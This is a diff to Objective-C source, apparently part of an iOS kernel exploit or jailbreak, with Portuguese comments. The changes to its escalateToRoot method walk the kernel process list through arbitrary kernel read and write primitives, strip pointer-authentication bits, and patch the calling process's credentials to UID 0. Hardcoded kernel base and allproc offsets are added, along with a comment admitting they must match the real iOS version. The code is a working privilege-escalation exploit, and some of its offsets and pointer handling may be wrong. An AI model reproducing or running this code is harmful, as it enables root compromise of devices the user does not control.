@@ -86,22 +86,31 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 
 - (BOOL)escalateToRoot {
     uint64_t slide = [self leakKernelSlide];
-    uint64_t proc = [self kread64:(KERN_BASE_STATIC + slide + OFFSET_ALLPROC)];
+    // Offset allproc precisa estar correto para a versão real (ex: iOS 16.x)
+    uint64_t proc_ptr = (0xFFFFFFF007004000 + slide + 0x8F50000);
+    uint64_t proc = [self kread64:proc_ptr];
     pid_t my_pid = getpid();
     
     while (proc != 0 && proc != 0xDEADBEEF) {
+        // --- ADICIONE ESTA LINHA (PAC STRIP) ---
+        // No A13, os ponteiros de kernel são assinados. Isso limpa a assinatura:
         proc = proc | 0xFFFFFF8000000000ULL; 
         
         if ((pid_t)[self kread64:(proc + 0x68)] == my_pid) {
             uint64_t ucred = [self kread64:(proc + 0xD8)];
-            [self kwrite64:(ucred + 0x18) value:0]; // UID 0
-            setuid(0); setgid(0);
+            // Limpa o PAC do ucred também antes de patchear
+            ucred = ucred | 0xFFFFFF8000000000ULL;
+            
+            [self kwrite64:(ucred + 0x18) value:0]; // Patch UID 0
+            setuid(0); 
+            setgid(0);
             return (getuid() == 0);
         }
         proc = [self kread64:(proc + 0x08)];
     }
     return NO;
 }
+
 
 #pragma mark - Outros Métodos do Header
 
